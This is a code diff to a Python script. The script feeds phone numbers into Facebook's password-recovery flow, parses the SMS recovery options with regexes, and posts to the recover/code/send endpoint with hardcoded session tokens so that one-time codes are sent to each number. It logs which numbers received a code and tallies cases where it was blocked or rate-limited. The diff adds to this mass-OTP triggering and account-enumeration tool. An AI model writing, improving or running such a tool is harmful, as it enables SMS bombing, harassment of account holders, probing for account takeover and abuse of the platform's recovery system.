@@ -176,45 +176,110 @@ def process_number(any_number, selected_ua, success_file):
         if "identify_search_error_title" in response_text or "no search results" in response_text:
             stats['no_id'] += 1
             print(f"{Fore.RED}[-] {any_number} : No Account Found")
-        else:
-            # Look for SMS options
-            methods = []
+            return
+        # Extract recovery methods - FIXED VERSION
+        recovery_methods = []
+        
+        # Method 1: Look for SMS options in input fields
+        sms_patterns = [
+            r'value="(send_sms.*?)"',
+            r'value="(.*sms.*)"',
+            r'name="recover_method"\s+value="(.*?)"',
+            r'recover_method.*?value=["\'](.*?)["\']'
+        ]
+        
+        for pattern in sms_patterns:
+            matches = re.findall(pattern, response.text, re.IGNORECASE)
+            for match in matches:
+                if 'sms' in match.lower():
+                    recovery_methods.append(match)
+        
+        # Method 2: Look for radio buttons
+        if not recovery_methods:
+            radio_matches = re.findall(r'<input[^>]*type=["\']radio["\'][^>]*value=["\']([^"\']*sms[^"\']*)["\'][^>]*>', 
+                                      response.text, re.IGNORECASE)
+            recovery_methods.extend(radio_matches)
+        
+        # Method 3: Look for data-store attribute
+        if not recovery_methods:
+            data_store_matches = re.findall(r'data-store=["\'][^"\']*sms[^"\']*["\']', response.text, re.IGNORECASE)
+            for match in data_store_matches:
+                value = re.search(r'value=["\']([^"\']+)["\']', match)
+                if value:
+                    recovery_methods.append(value.group(1))
+        
+        if not recovery_methods:
+            # Try to find any recovery method
+            all_methods = re.findall(r'value="([^"]*)"', response.text)
+            for method in all_methods:
+                if len(method) > 5 and any(x in method.lower() for x in ['send', 'recover', 'method']):
+                    recovery_methods.append(method)
+        
+        if recovery_methods:
+            # Use the first SMS method found
+            selected_method = recovery_methods[0]
+            print(f"{Fore.CYAN}[~] {any_number} : Found recovery method: {selected_method}")
             
-            # Pattern 1: Standard SMS method
-            methods.extend(re.findall(r'value="([^"]*sms[^"]*)"', response.text, re.IGNORECASE))
+            # Step 2: Send SMS request
+            sms_payload = {
+                'recover_method': selected_method,
+                'contact_index': '0',
+                'did_submit': 'Continue',
+                'jazoest': '2940',
+                'lsd': 'AdGpHjOQEFs',
+                '__user': '0',
+                '__a': '1',
+                '__req': '7',
+                '__hs': '20468.BP:DEFAULT.2.0...0',
+                'dpr': '1',
+                '__ccg': 'EXCELLENT',
+                '__rev': '1032049861',
+                '__s': 'sflqtb:my7aaa:6evjim',
+                '__hsi': '7595674312159156008',
+                '__dyn': '7xeUmwkHg7ebwKBAg5S1Dxu13wqovzEdEc8uxa0CEbo1nEhw2nVE4W0qa0FE2awt81s8hwGwQw4iwBgao6C0Mo2swaO4U2zxe3C0D85a1qw8Xxm16wa-0raazo7u0zE2ZwrU6C0hq1Iw5lwnqwIwtU5K0UE62',
+                '__hsdp': 'gIMggq8yqA7h0hp3D8py4bDyeeqKEyewQocAE7iO04Ewd63B240GGw4iw',
+                '__hblp': '0TwbO1nw5Uw3iUfE4-0a6wto0lUw28E08qU0hjw2A805h60c-w3YJ0fO6oll02ZU0qPw13i0FU',
+                '__spin_r': '1032049861',
+                '__spin_b': 'trunk',
+                '__spin_t': '1768505739'
+            }
             
-            # Pattern 2: send_sms method
-            if not methods:
-                methods.extend(re.findall(r'value="(send_sms[^"]*)"', response.text, re.IGNORECASE))
-            
-            # Pattern 3: Check for recovery options in form
-            if not methods:
-                for line in response.text.split('\n'):
-                    if 'sms' in line.lower() and 'value=' in line:
-                        match = re.search(r'value="([^"]+)"', line)
-                        if match:
-                            methods.append(match.group(1))
-            
-            if methods:
-                # Use first SMS method found
-                confirm_payload = {
-                    'recover_method': methods[0],
-                    'contact_index': '0',
-                    'did_submit': 'Continue'
-                }
-                
-                send_res = session.post(
-                    "https://www.facebook.com/recover/code/send/",
-                    data=confirm_payload,
+            try:
+                send_response = session.post(
+                    'https://www.facebook.com/recover/code/send/',
+                    data=sms_payload,
                     headers=headers,
-                    timeout=15
+                    cookies=cookies,
+                    timeout=30,
+                    allow_redirects=True
                 )
                 
-                send_text = send_res.text.lower()
+                # Check if SMS was sent successfully
+                response_text = send_response.text.lower()
                 
-                if "code/send" in send_res.url or "confirm" in send_text or "code sent" in send_text:
+                # Success indicators
+                success_indicators = [
+                    'code sent',
+                    'enter confirmation code',
+                    'confirm phone number',
+                    'sent to your phone',
+                    'check your messages',
+                    'recover/code',
+                    'verification code'
+                ]
+                
+                # Error indicators
+                error_indicators = [
+                    'try again later',
+                    'temporarily blocked',
+                    'too many attempts',
+                    'security check',
+                    'rate limit'
+                ]
+                
+                if any(indicator in response_text for indicator in success_indicators):
                     stats['success'] += 1
-                    print(f"{Fore.GREEN}[+] {any_number} : OTP Sent Successfully!")
+                    print(f"{Fore.GREEN}[✓] {any_number} : OTP Sent Successfully!")
                     
                     # Save to success file
                     try:
@@ -225,17 +290,41 @@ def process_number(any_number, selected_ua, success_file):
                         alt_file = '/sdcard/success_sent.txt' if success_file != '/sdcard/success_sent.txt' else 'success_sent.txt'
                         with open(alt_file, 'a', encoding='utf-8') as f:
                             f.write(f"{any_number}\n")
-                            
-                elif "try again later" in send_text or "temporarily blocked" in send_text:
+                
+                elif any(indicator in response_text for indicator in error_indicators):
                     stats['error'] += 1
-                    print(f"{Fore.YELLOW}[!] {any_number} : Try Again Later (Blocked)")
+                    print(f"{Fore.YELLOW}[!] {any_number} : Rate Limited/Try Again Later")
+                
+                elif "not_my_account" in send_response.url or "identify" in send_response.url:
+                    stats['error'] += 1
+                    print(f"{Fore.YELLOW}[!] {any_number} : Failed - Redirected to Start")
+                
                 else:
-                    stats['error'] += 1
-                    print(f"{Fore.YELLOW}[!] {any_number} : Security Check Required")
-            else:
-                stats['no_sms'] += 1
-                print(f"{Fore.YELLOW}[!] {any_number} : No SMS Option Found")
-
+                    # Check status code
+                    if send_response.status_code == 200:
+                        stats['success'] += 1
+                        print(f"{Fore.GREEN}[✓] {any_number} : Request Sent (Status 200)")
+                        
+                        # Save to success file
+                        try:
+                            with open(success_file, 'a', encoding='utf-8') as f:
+                                f.write(f"{any_number}\n")
+                        except:
+                            alt_file = '/sdcard/success_sent.txt' if success_file != '/sdcard/success_sent.txt' else 'success_sent.txt'
+                            with open(alt_file, 'a', encoding='utf-8') as f:
+                                f.write(f"{any_number}\n")
+                    else:
+                        stats['error'] += 1
+                        print(f"{Fore.YELLOW}[!] {any_number} : Failed (Status {send_response.status_code})")
+            
+            except Exception as send_error:
+                stats['error'] += 1
+                print(f"{Fore.MAGENTA}[?] {any_number} : Send Error - {str(send_error)[:50]}")
+        
+        else:
+            stats['no_sms'] += 1
+            print(f"{Fore.YELLOW}[!] {any_number} : No SMS Recovery Option Available")
+    
     except requests.exceptions.Timeout:
         stats['error'] += 1
         print(f"{Fore.MAGENTA}[?] {any_number} : Timeout Error")
